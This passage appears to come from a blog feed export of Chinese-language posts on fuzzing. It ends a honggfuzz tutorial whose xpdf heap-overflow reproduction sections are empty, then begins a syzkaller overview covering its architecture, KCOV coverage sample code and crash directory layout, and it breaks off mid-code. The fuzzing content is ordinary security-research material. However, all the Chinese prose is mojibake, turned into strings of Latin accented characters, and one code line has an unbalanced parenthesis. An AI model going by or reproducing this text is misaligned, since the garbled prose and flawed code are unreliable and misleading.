<code>--mutate_cmd</code> è°ƒç”¨å¤–éƒ¨è„šæœ¬ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">honggfuzz --mutate_cmd ./custom_mutator.py -- ./target ___FILE___<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">honggfuzz --mutations_per_round=100 -- ./target ___FILE___<br></code></pre></td></tr></table></figure><h3 id="æŒä¹…åŒ–æ¨¡å¼"><a href="#æŒä¹…åŒ–æ¨¡å¼" class="headerlink" title="æŒä¹…åŒ–æ¨¡å¼"></a>æŒä¹…åŒ–æ¨¡å¼</h3><p>é¿å…è¿›ç¨‹é‡å¯å¼€é”€ï¼ˆé€‚ç”¨äºåˆå§‹åŒ–å¤æ‚çš„ç¨‹åºï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// ç›®æ ‡ä»£ç ä¸­è°ƒç”¨HF_ITER()</span><br><span class="hljs-keyword">while</span> (__HF_ITER(&amp;buf, &amp;len)) &#123;<br>    process_input(buf, len);<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¼–è¯‘åè¿è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">honggfuzz --persistent -- ./target_persistent<br></code></pre></td></tr></table></figure><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>å¤ç° xpdf ä¸­å­˜åœ¨çš„ä¸€ä¸ªå †æº¢å‡ºæ¼æ´ã€‚</p><h3 id="å‰æœŸå‡†å¤‡"><a href="#å‰æœŸå‡†å¤‡" class="headerlink" title="å‰æœŸå‡†å¤‡"></a>å‰æœŸå‡†å¤‡</h3><h3 id="å¼€å§‹Fuzz"><a href="#å¼€å§‹Fuzz" class="headerlink" title="å¼€å§‹Fuzz"></a>å¼€å§‹Fuzz</h3><h3 id="åˆ†æCrash"><a href="#åˆ†æCrash" class="headerlink" title="åˆ†æCrash"></a>åˆ†æCrash</h3><h2 id="åè¨€"><a href="#åè¨€" class="headerlink" title="åè¨€"></a>åè¨€</h2><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><blockquote><p><a href="https://github.com/google/honggfuzz/wiki">GitHub Wiki</a><br><a href="https://bbs.kanxue.com/thread-247954.htm">[åŸåˆ›] honggfuzzæ¼æ´æŒ–æ˜æŠ€æœ¯æ·±ç©¶ç³»åˆ—-äºŒè¿›åˆ¶æ¼æ´-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzzers </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>syzkalleråˆæ¢</title>
      <link href="/2025/07/01/fuzz/syzkaller/"/>
      <url>/2025/07/01/fuzz/syzkaller/</url>
      
        <content type="html"><![CDATA[<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>Syzkaller æ˜¯ Google çš„å®‰å…¨ç ”ç©¶äººå‘˜å¼€å‘å¹¶ç»´æŠ¤çš„å¼€æºå†…æ ¸ Fuzz å·¥å…·ï¼Œç›®å‰ä¸»è¦ç”± <a href="https://github.com/dvyukov">dvyukov</a> ç»´æŠ¤ã€‚å®ƒæ˜¯ä½¿ç”¨ Go è¯­è¨€ç¼–å†™çš„ï¼Œä¹Ÿæœ‰å°‘éƒ¨åˆ† C ä»£ç ï¼Œå…·æœ‰éƒ¨ç½²å¿«é€Ÿã€ä½¿ç”¨ç®€ä¾¿çš„ç‰¹ç‚¹ï¼ŒåŒæ—¶è¿˜æ”¯æŒå¤šç§æ“ä½œç³»ç»Ÿå¦‚ï¼šLinuxã€Androidã€Windowsã€openbsdã€darwin ç­‰ç³»ç»Ÿã€‚ä¸è¿‡å®ƒæ”¯æŒæœ€å…¨é¢çš„è¿˜æ˜¯ Linux ç³»ç»Ÿï¼Œå¯¹å…¶å®ƒç³»ç»Ÿçš„æ”¯æŒéƒ½ä¸åŒç¨‹åº¦å·®ä¸€ç‚¹ã€‚</p><p>æœ‰ç ”ç©¶äººå‘˜åšè¿‡ç§»æ¤syzkaller fuzz windows WSL[2]å’ŒDarwin&#x2F;XNU[1][5]çš„å°è¯•ï¼Œä¹Ÿéƒ½å–å¾—äº†è¾ƒå¥½çš„æˆæœã€‚å¯ä»¥è¯´ï¼Œsyzkalleræ˜¯å½“ä»Šå®‡å®™æœ€å¼ºå¤§çš„å†…æ ¸fuzzå·¥å…·äº†ã€‚æˆ‘ä»¬å°†ä»æ•´ä½“æ¶æ„å¼€å§‹ï¼Œä»‹ç»syzkallerä¸€äº›å®ç°çš„ç»†èŠ‚ã€‚ç›®å‰åœ¨githubä¸Šsyzkalleré™¤äº†masteråˆ†æ”¯ä¹‹å¤–è¿˜æœ‰ä¸€ä¸ªlong-lineåˆ†æ”¯å’Œusb-fuzzeråˆ†æ”¯ï¼Œusb-fuzzeråˆ†æ”¯æ˜¯xairyç”¨æ¥æŒ–æ˜USBé©±åŠ¨æ¼æ´çš„ä¸€ä¸ªåˆ†æ”¯ï¼Œåœ¨OffensiveCon2019ä¸Šè®²è¿‡[7]ã€‚</p><p>æˆ‘ä»¬æœ¬æ–‡çš„å­¦ä¹ å°±æ˜¯ä»¥ fuzzing Linux ä¸ºä¸»ã€‚</p><p>ä»€ä¹ˆæ˜¯è¦†ç›–å¼•å¯¼ï¼ˆ<strong>coverage-guided</strong>ï¼‰ï¼Ÿ</p><ul><li><p>è¦†ç›–å¼•å¯¼ï¼Œå³<strong>é€šè¿‡å‘ç›®æ ‡ç¨‹åºæ’æ¡©ï¼Œç»Ÿè®¡ä»£ç è¦†ç›–ï¼Œåé¦ˆç»™æ¨¡ç³Šæµ‹è¯•å¼•æ“ï¼ˆfuzzerï¼Œå³æ¨¡ç³Šæµ‹è¯•å·¥å…·ï¼‰ï¼Œåé¦ˆä¿¡æ¯ç”¨äºå˜å¼‚ç§å­ï¼Œç”Ÿæˆæ›´é«˜è´¨é‡çš„è¾“å…¥ï¼Œä½¿å¾— fuzzer èƒ½å¤Ÿç”¨æ›´å¥½çš„è¾“å…¥è®©è¢«æµ‹ç¨‹åºè¾¾åˆ°æ›´é«˜çš„ä»£ç è¦†ç›–ç‡ã€‚</strong></p></li><li><p>å¯¹äºæ¯ä¸ªç›®æ ‡ï¼Œfuzzer éƒ½ä¼šæ„å»ºä¸€ä¸ªè¾“å…¥çš„è¯­æ–™åº“ï¼Œéšç€ fuzzer é€šè¿‡å˜å¼‚è¯­æ–™åº“å‘ç°æ–°çš„è¾“å…¥ï¼Œè¦†ç›–ç‡ä¼šä¸æ–­å¢é•¿ã€‚å¸¸è§çš„æ¨¡ç³Šæµ‹è¯•å¼•æ“ï¼ˆfuzzerï¼Œå³æ¨¡ç³Šæµ‹è¯•å·¥å…·ï¼‰æœ‰ aflã€honggfuzzã€libfuzzer ä»¥åŠæœ¬æ¬¡æ‰€è¯´çš„ syzkallerï¼Œè¿™äº›éƒ½æ˜¯ç»å…¸çš„ fuzzing å·¥å…·ã€‚</p></li></ul><p>ä¹‹å‰æåˆ°è¿‡ <a href="https://github.com/google/syzkaller">syzkaller</a>ï¼Œå®ƒå¯ä»¥è¯´æ˜¯ç›®å‰æœ€å¹¿æ³›ä½¿ç”¨çš„ OS fuzzerã€‚å®ƒä¸ä»…æä¾›äº†ç®€å•çš„éƒ¨ç½²æµç¨‹ï¼Œåªéœ€è¦å‡ ä¸ªå‘½ä»¤ï¼Œè¿˜å…è®¸ç”¨æˆ·è‡ªå®šä¹‰æ‰§è¡Œç¯å¢ƒï¼Œåƒæ˜¯å¯ä»¥è®¾ç½®å…è®¸çš„ syscallã€VM å®ä¾‹æ•°ã€è‡ªå®šä¹‰ syscall ä»¥åŠè°ƒç”¨ä¾èµ–ç­‰ã€‚è€Œä¸”å®ƒæœ‰æ¸…æ™°çš„ç”¨æˆ·ç•Œé¢ï¼Œè®©ç”¨æˆ·èƒ½å¤Ÿçœ‹åˆ°å½“å‰æ‰§è¡Œçš„çŠ¶æ€ï¼ŒåŒ…æ‹¬å‘ç”Ÿå´©æºƒçš„ä½ç½®å’Œé”™è¯¯æŠ¥å‘Šã€å½“å‰å°šæœªæ‰§è¡Œçš„ seedï¼Œç”šè‡³å¯ä»¥æŸ¥çœ‹æºä»£ç ä¸­å„ä¸ª basic block çš„æ‰§è¡Œæ¬¡æ•°ã€‚</p><p>å¦‚æœä½ å¯¹ç”¨æˆ·ç•Œé¢æä¾›çš„åŠŸèƒ½æ„Ÿå…´è¶£ï¼Œè¿™é‡Œæä¾›äº†ä¸€ä¸ªå¤–éƒ¨å¼€è®¾çš„ <a href="https://elisa-builder-00.iol.unh.edu/syzkaller/">syzkaller server</a> ä¾›ä½ å‚è€ƒã€‚åŒæ—¶ï¼Œsyzkaller ä¹Ÿæœ‰å®˜æ–¹ç»´æŠ¤ï¼Œå¹¶ä¸æ–­å¯¹æœ€æ–°ç‰ˆæœ¬çš„å†…æ ¸è¿›è¡Œ fuzzing çš„ <a href="https://syzkaller.appspot.com/">syzbot</a>ï¼Œç ”ç©¶äººå‘˜å¯ä»¥é€šè¿‡åˆ†æ syzbot æ‰€æŠ¥å‘Šçš„æ¼æ´ï¼Œäº†è§£æŸä¸ªæ“ä½œç³»ç»Ÿä¸­å¸¸è§çš„æ¼æ´å‘ç”ŸåŒºåŸŸã€‚</p><p>ä¸‹é¢æ˜¯ syzkaller çš„æ¶æ„å›¾ï¼Œä¸»è¦åˆ†ä¸ºä¸‰ä¸ªç»„ä»¶ï¼Œåˆ†åˆ«æ˜¯ <strong>syz-manager</strong>ã€<strong>syz-fuzzer</strong> å’Œ <strong>syz-executor</strong>ï¼š</p><p><img src="/Linux/assets/Pasted%20image%2020250521160056.png"></p><ul><li><strong>syz-manager</strong> - è¿è¡Œåœ¨ host ä¸Šï¼Œä¸»è¦ç”¨äºç®¡ç† VM å®ä¾‹å’Œç”¨æˆ·ç•Œé¢<ul><li>ä¸€å¼€å§‹ä¼šåˆå§‹åŒ–æ•´ä¸ªç¯å¢ƒï¼Œä¹‹åè´Ÿè´£ç®¡ç†ç³»ç»Ÿå’Œè¾“å‡ºç»“æœï¼Œæ¶‰åŠ fuzzer æœºåˆ¶è¾ƒå°‘ã€‚</li></ul></li><li><strong>syz-executor</strong> - æ‰§è¡Œ syscall sequence<ul><li>ä¸æ–­ç­‰å¾… syz-fuzzer ä¼ æ¥çš„ â€œprogramâ€ï¼Œå³ä¸€ç»„ syscall ç»„åˆ</li><li>ä¸æ–­é‡å¤æ‰§è¡Œè¿™äº›ç¨‹åº</li></ul></li></ul><p>æ­¤å¤–ï¼Œsyzkaller è¿˜æä¾›äº†è®¸å¤šå¯ç”¨çš„å·¥å…·ï¼Œæ¯”å¦‚å¤ç°å´©æºƒè¾“å…¥æˆ–å¯¹è¾“å…¥åšæœ€å°åŒ–ç­‰ï¼Œä½†è¿™äº›å·¥å…·ä¸ä¸€å®šä¼šç”¨åˆ°ï¼Œæ‰€ä»¥æ²¡æœ‰åˆ—åœ¨æ¶æ„å›¾ä¸­ã€‚ç¼–è¯‘å†…æ ¸æ—¶æ‰€ä½¿ç”¨çš„ kernel config åªéœ€è¦æ»¡è¶³ syzkaller æ‰€ä½¿ç”¨çš„åŠŸèƒ½ï¼Œå…¶ä»–éƒ¨åˆ†å¯ä»¥æ ¹æ®éœ€è¦è°ƒæ•´ã€‚</p><h3 id="KASAN"><a href="#KASAN" class="headerlink" title="KASAN"></a><strong>KASAN</strong></h3><h3 id="KCOV"><a href="#KCOV" class="headerlink" title="KCOV"></a>KCOV</h3><p>æ”¶é›† coverage çš„æ–¹å¼æ˜¯ syzkaller çš„ä¸€ä¸ªé‡è¦ç‰¹ç‚¹ï¼Œä¹‹å‰åœ¨ Day22 æåˆ°è¿‡ kAFL æ—¶ä¹Ÿç¨å¾®ä»‹ç»è¿‡ï¼Œsyzkaller ä½¿ç”¨ <code>KCOV</code> æ¥æ”¶é›† coverageï¼Œè€Œ <code>KCOV</code> çš„å¼€å‘äººå‘˜ä¹‹ä¸€å°±æ˜¯ syzkaller çš„ç»´æŠ¤è€…ã€‚è¿™é‡Œå°†ç¨å¾®ä»‹ç»ä¸€ä¸‹ <code>KCOV</code>ï¼Œè¯¦ç»†å†…å®¹å¯ä»¥å‚è€ƒ <a href="https://docs.kernel.org/dev-tools/kcov.html">KCOV documentation</a>ã€‚</p><p>ä»¥ä¸‹æ˜¯ä½¿ç”¨ <code>KCOV</code> çš„ç¤ºä¾‹ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCOV_INIT_TRACE  _IOR(<span class="hljs-string">&#x27;c&#x27;</span>, 1, unsigned long)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCOV_ENABLE      _IO(<span class="hljs-string">&#x27;c&#x27;</span>, 100)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCOV_DISABLE     _IO(<span class="hljs-string">&#x27;c&#x27;</span>, 101)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COVER_SIZE       (64&lt;&lt;10) <span class="hljs-comment">// 0x10000</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCOV_TRACE_PC  0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCOV_TRACE_CMP 1</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-comment">// ç”¨æ¥æ”¶é›† coverage çš„æ¥å£</span><br>    fd = open(<span class="hljs-string">&quot;/sys/kernel/debug/kcov&quot;</span>, O_RDWR);<br>    <span class="hljs-comment">// åˆå§‹åŒ– trace æ¨¡å¼ï¼Œè®¾ç½® trace å¤§å°</span><br>    ioctl(fd, KCOV_INIT_TRACE, COVER_SIZE);<br>    <span class="hljs-comment">// åˆ›å»ºä¸€å—å†…æ ¸å’Œç”¨æˆ·ç©ºé—´å…±äº«çš„å†…å­˜</span><br>    cover = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>*)mmap(<span class="hljs-literal">NULL</span>, COVER_SIZE * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>),<br>                                 PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="hljs-number">0</span>);<br>    <span class="hljs-comment">// å¼€å¯å½“å‰çº¿ç¨‹çš„ coverage æ”¶é›†</span><br>    ioctl(fd, KCOV_ENABLE, KCOV_TRACE_PC);<br><br>    <span class="hljs-comment">// é‡ç½® coverage</span><br>    __atomic_store_n(&amp;cover[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>, __ATOMIC_RELAXED);<br>    <br>    <span class="hljs-comment">// ç›®æ ‡ syscall</span><br>    read(<span class="hljs-number">-1</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-comment">// è·å–è®°å½•çš„åœ°å€æ•°é‡</span><br>    n = __atomic_load_n(&amp;cover[<span class="hljs-number">0</span>], __ATOMIC_RELAXED);<br>    <span class="hljs-comment">// éå†æ•´ä¸ª bufferï¼Œæ‰“å°è®¿é—®çš„åœ°å€</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%lx\n&quot;</span>, cover[i + <span class="hljs-number">1</span>]);<br><br>    <span class="hljs-comment">// å…³é—­å½“å‰çº¿ç¨‹çš„ coverage æ”¶é›†</span><br>    ioctl(fd, KCOV_DISABLE, <span class="hljs-number">0</span>);<br>    <span class="hljs-comment">// é‡Šæ”¾èµ„æº</span><br>    munmap(cover, COVER_SIZE * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)));<br>    close(fd);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>èƒŒåçš„åŸç†æ˜¯ä¹‹å‰åœ¨ Day11 ä»‹ç»çš„ <code>__sanitizer_cov_trace_pc()</code> æ’æ¡©ï¼Œä¹Ÿå°±æ˜¯æ¯ä¸ª basic block æ‰§è¡Œå‰éƒ½ä¼šè°ƒç”¨ä¸€æ¬¡ï¼Œ<code>KCOV</code> æ‰€åšçš„æ’æ¡©å†…å®¹å¦‚ä¸‹ï¼Œå‚è€ƒ Linux å†…æ ¸çš„ <a href="https://elixir.bootlin.com/linux/latest/source/kernel/kcov.c#L192">kcov.c</a>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> notrace __sanitizer_cov_trace_pc(<span class="hljs-type">void</span>)<br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ip = canonicalize_ip(_RET_IP_);<br><br>    t = current;<br>    <span class="hljs-keyword">if</span> (!check_kcov_mode(KCOV_MODE_TRACE_PC, t))<br>        <span class="hljs-keyword">return</span>;<br>    <br>    area = t-&gt;kcov_area;<br>    pos = READ_ONCE(area[<span class="hljs-number">0</span>]) + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (likely(pos &lt; t-&gt;kcov_size)) &#123;<br>        WRITE_ONCE(area[<span class="hljs-number">0</span>], pos);<br>        barrier();<br>        area[pos] = ip;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åŸºæœ¬åŸç†"><a href="#åŸºæœ¬åŸç†" class="headerlink" title="åŸºæœ¬åŸç†"></a>åŸºæœ¬åŸç†</h3><p>Syzkalleræ˜¯ä¸€ç§Linuxå†…æ ¸æ¨¡ç³Šæµ‹è¯•å·¥å…·ï¼Œå…·æœ‰è¦†ç›–å¼•å¯¼æ¨¡ç³Šæµ‹è¯•çš„ç‰¹ç‚¹ã€‚ä»¥ä¸‹æ˜¯Syzkallerçš„åŸºæœ¬å·¥ä½œæµç¨‹åŠå…¶ç»„æˆéƒ¨åˆ†çš„æè¿°ã€‚</p><p>Syzkallerçš„è¿‡ç¨‹ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼›çº¢è‰²æ ‡ç­¾æŒ‡ç¤ºç›¸åº”çš„é…ç½®é€‰é¡¹ã€‚</p><p>Syzkallerçš„è¿›ç¨‹ç»“æ„ï¼š</p><p><strong>syz-manager</strong> è´Ÿè´£ä»¥ä¸‹ä»»åŠ¡ï¼š</p><ul><li><p>å¯åŠ¨&#x2F;é‡å¯&#x2F;ç›‘æ§è™šæ‹Ÿæœºå®ä¾‹ï¼ˆVMï¼‰ã€‚</p></li><li><p>è¿›è¡Œå®é™…çš„æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹ï¼ˆè¾“å…¥ç”Ÿæˆã€çªå˜ã€æœ€å°åŒ–ç­‰ï¼‰ã€‚</p></li><li><p>æŒä¹…åŒ–è¯­æ–™åº“å’Œå´©æºƒæŠ¥å‘Šå­˜å‚¨ã€‚</p></li><li><p>å®ƒè¿è¡Œåœ¨ä¸»æœºä¸Šï¼Œä¸»æœºæœ‰ä¸€ä¸ªç¨³å®šçš„å†…æ ¸ï¼Œä¸ä¼šå—åˆ°ç™½å™ªå£°æ¨¡ç³Šæµ‹è¯•è´Ÿè½½çš„å½±å“ã€‚</p></li></ul><p><strong>syz-manager</strong> å¯åŠ¨è¿›ç¨‹ï¼ˆæ¯ä¸ªè™šæ‹Ÿæœºä¸€ä¸ªï¼‰ã€‚è¿™äº›è¿›ç¨‹é€šè¿‡RPCé€šä¿¡æ¥æ¥æ”¶å¿…é¡»æ‰§è¡Œçš„ç¨‹åºï¼Œå¹¶æŠ¥å‘Šæ‰§è¡Œç»“æœï¼ˆé”™è¯¯çŠ¶æ€ã€è¦†ç›–ç‡ç­‰ï¼‰ã€‚</p><p><strong>syz-executor</strong>ï¼šæ‰§è¡Œç¨‹åºçš„è¿›ç¨‹ï¼Œè´Ÿè´£å¯åŠ¨ä¸´æ—¶å­è¿›ç¨‹ã€‚æ¯ä¸ªä¸´æ—¶å­è¿›ç¨‹æ‰§è¡Œä¸€ä¸ªå•ä¸€çš„è¾“å…¥ï¼ˆå³ä¸€ç³»åˆ—çš„ç³»ç»Ÿè°ƒç”¨ï¼‰ã€‚å®ƒè¢«è®¾è®¡ä¸ºå°½å¯èƒ½ç®€å•ï¼Œä»¥é¿å…å¹²æ‰°æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹ï¼Œä½¿ç”¨C++ç¼–å†™å¹¶ç¼–è¯‘ä¸ºé™æ€äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä½¿ç”¨å…±äº«å†…å­˜è¿›è¡Œé€šä¿¡ã€‚</p><ul><li>ç³»ç»Ÿè°ƒç”¨æè¿°</li></ul><p>è¿›ç¨‹åŸºäºè¿™é‡Œæè¿°çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆsyscallï¼‰ç”Ÿæˆç¨‹åºã€‚</p><ul><li>è¦†ç›–ç‡</li></ul><p>Syzkalleræ˜¯ä¸€ä¸ªè¦†ç›–å¼•å¯¼æ¨¡ç³Šæµ‹è¯•å·¥å…·ï¼Œå…³äºè¦†ç›–ç‡æ”¶é›†çš„è¯¦ç»†ä¿¡æ¯å¯ä»¥åœ¨æ­¤å¤„æ‰¾åˆ°ã€‚</p><ul><li>å´©æºƒæŠ¥å‘Š</li></ul><p>å½“Syzkallerå‘ç°å´©æºƒæ—¶ï¼Œå®ƒä¼šå°†ç›¸å…³ä¿¡æ¯ä¿å­˜åœ¨ä¸€ä¸ªç›®å½•ä¸­ã€‚è¯¥ç›®å½•åŒ…å«ä¸€ä¸ªå­ç›®å½•ï¼Œæ¯ç§ç‹¬ç‰¹çš„å´©æºƒç±»å‹å¯¹åº”ä¸€ä¸ªå­ç›®å½•ã€‚æ¯ä¸ªå­ç›®å½•ä¸­åŒ…å«ä¸€ä¸ªæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«ä¸€ä¸ªå”¯ä¸€çš„å­—ç¬¦ä¸²æ ‡è¯†ç¬¦ï¼Œç”¨äºå´©æºƒçš„æ ‡è¯†å’Œå»é‡ã€‚è¯¥å­ç›®å½•è¿˜åŒ…å«æœ€å¤š100ä¸ªæ–‡ä»¶ï¼Œæ¯ä¸ªæ–‡ä»¶åŒ…å«ä¸€å¯¹ç”¨äºæµ‹è¯•æœºå™¨å´©æºƒçš„æ—¥å¿—æ–‡ä»¶å’ŒæŠ¥å‘Šæ–‡ä»¶ã€‚</p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">syzkaller_workdir</span>/crashes/<br>   â”œâ”€â”€ <span class="hljs-number">6e512290</span>efa36515a7a27e53623304d20d1c3e<br>   â”‚   â”œâ”€â”€ description<br>   â”‚   â”œâ”€â”€ log0<br>   â”‚   â”œâ”€â”€ report0<br>   â”‚   â”œâ”€â”€ log1<br>   â”‚   â”œâ”€â”€ report1<br>   â”‚   â””â”€â”€ ...<br>   â”œâ”€â”€ <span class="hljs-number">77</span>c578906abe311d06227b9dc3bffa4c52676f<br>   â”‚   â”œâ”€â”€ description<br>   â”‚   â”œâ”€â”€ log0<br>   â”‚   â”œâ”€â”€ report0<br>   â”‚   â””â”€â”€ ...<br></code></pre></td></tr></table></figure><p>æè¿°ä¿¡æ¯é€šè¿‡ä¸€ç»„æ­£åˆ™è¡¨è¾¾å¼æå–ã€‚è¿™äº›è¡¨è¾¾å¼å¯èƒ½éœ€è¦æ‰©å±•ï¼Œå°¤å…¶æ˜¯å½“ä½¿ç”¨ä¸åŒçš„å†…æ ¸æ¶æ„æ—¶ï¼Œæˆ–è€…é‡åˆ°ä¹‹å‰æœªè§è¿‡çš„å†…æ ¸é”™è¯¯ä¿¡æ¯æ—¶ã€‚</p><ul><li><p><strong>logN</strong> æ–‡ä»¶åŒ…å«åŸå§‹æ—¥å¿—ï¼ŒåŒ…æ‹¬å†…æ ¸æ§åˆ¶å°è¾“å‡ºä»¥åŠåœ¨å´©æºƒå‰æ‰§è¡Œçš„ç¨‹åºã€‚å¯ä»¥å°†è¿™äº›æ—¥å¿—æ–‡ä»¶é¦ˆé€ç»™å´©æºƒä½ç½®å’Œæœ€å°åŒ–å·¥å…·ï¼Œæˆ–è€…ç”¨äºæ‰‹åŠ¨å®šä½ã€‚</p></li><li><p><strong>reportN</strong> æ–‡ä»¶åŒ…å«åå¤„ç†å’Œç¬¦å·åŒ–çš„å†…æ ¸å´©æºƒæŠ¥å‘Šï¼ˆä¾‹å¦‚KASANæŠ¥å‘Šï¼‰ã€‚é€šå¸¸ä½ åªéœ€è¦ä¸€å¯¹è¿™äº›æ–‡ä»¶ï¼ˆå³log0å’Œreport0ï¼‰ï¼Œå› ä¸ºå®ƒä»¬é€šå¸¸æè¿°ç›¸åŒçš„å†…æ ¸æ¼æ´ã€‚ä½†ä¸ºäº†åº”å¯¹å´©æºƒä¸å®¹æ˜“é‡ç°çš„æƒ…å†µï¼ŒSyzkalleræœ€å¤šä¼šä¿å­˜100å¯¹æ–‡ä»¶ã€‚</p></li><li><p>ä¸‰ç§ç‰¹æ®Šçš„å´©æºƒç±»å‹ï¼š</p></li></ul><ol><li><p><strong>æµ‹è¯•æœºå™¨æ²¡æœ‰è¾“å‡º</strong>ï¼šæµ‹è¯•æœºå™¨å®Œå…¨æ²¡æœ‰è¾“å‡ºã€‚</p></li><li><p><strong>ä¸æµ‹è¯•æœºå™¨ä¸¢å¤±è¿æ¥</strong>ï¼šä¸æœºå™¨çš„SSHè¿æ¥æ„å¤–æ–­å¼€ã€‚</p></li><li><p><strong>æµ‹è¯•æœºå™¨æ²¡æœ‰æ‰§è¡Œç¨‹åº</strong>ï¼šæœºå™¨çœ‹èµ·æ¥æ­£å¸¸ï¼Œä½†é•¿æ—¶é—´æ²¡æœ‰æ‰§è¡Œæµ‹è¯•ç¨‹åºã€‚</p></li></ol><p>é€šå¸¸ï¼Œæ‚¨ä¸ä¼šçœ‹åˆ°è¿™äº›å´©æºƒç±»å‹çš„æ–‡ä»¶ï¼ˆä¾‹å¦‚ï¼Œå¦‚æœæµ‹è¯•æœºå™¨æ²¡æœ‰è¾“å‡ºï¼ŒæŠ¥å‘Šä¸­æ²¡æœ‰æ•°æ®ï¼‰ã€‚æœ‰æ—¶è¿™äº›å´©æºƒæœ¬èº«å¯èƒ½æ˜¯ä¸€ä¸ªæ¼æ´çš„æŒ‡ç¤ºï¼ˆç‰¹åˆ«æ˜¯å¦‚æœåœ¨æ—¥å¿—ä¸­çœ‹åˆ°Goçš„panicæ¶ˆæ¯ï¼‰ã€‚ä½†é€šå¸¸ï¼Œå®ƒä»¬å¯èƒ½æ„å‘³ç€å†…æ ¸æ­»é”æˆ–ç±»ä¼¼çš„ä¸¥é‡é—®é¢˜ï¼ˆä¾‹å¦‚ï¼š1ã€2ã€3ç­‰ï¼‰ã€‚</p><h3 id="syz-manager"><a href="#syz-manager" class="headerlink" title="syz-manager"></a>syz-manager</h3><p><code>syz-manager</code> æ˜¯æ•´ä¸ª syzkaller ç³»ç»Ÿçš„å…¥å£ã€‚ä»¥ä¸‹æ˜¯ç¨‹åºä»£ç  <code>syz-manager/manager.go</code> çš„ä¸€éƒ¨åˆ†ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 